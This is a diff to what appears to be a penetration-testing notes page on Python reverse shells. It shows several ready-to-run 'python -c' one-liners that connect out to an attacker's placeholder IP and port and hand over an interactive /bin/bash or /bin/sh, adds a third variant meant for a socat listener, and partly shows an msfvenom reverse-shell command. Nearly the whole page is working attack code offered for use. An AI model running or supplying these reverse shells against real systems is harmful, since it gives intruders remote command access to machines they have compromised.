@@ -4,16 +4,22 @@
 
 ### 1.1 - IPv4
 
-Method 1 with IPv4
+First variant.
 
 ```
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-Method 2 with IPv4
+Second variant.
 
 ```
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+Third variant that works with [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Shells/Shell Handler/Cross Platform/Manual/Socat|socat]] listener.
+
+```
+$ python -c 'import sys,socket,os,pty;s=socket.socket(); s.connect((os.getenv("<IP>"),int(os.getenv("<PORT>")))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'
 ```
 
 ### 1.2 - IPv6
@@ -32,6 +38,8 @@ $ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] ssl
 
 ---
 ## References
+
+- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)
 
 - [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
 
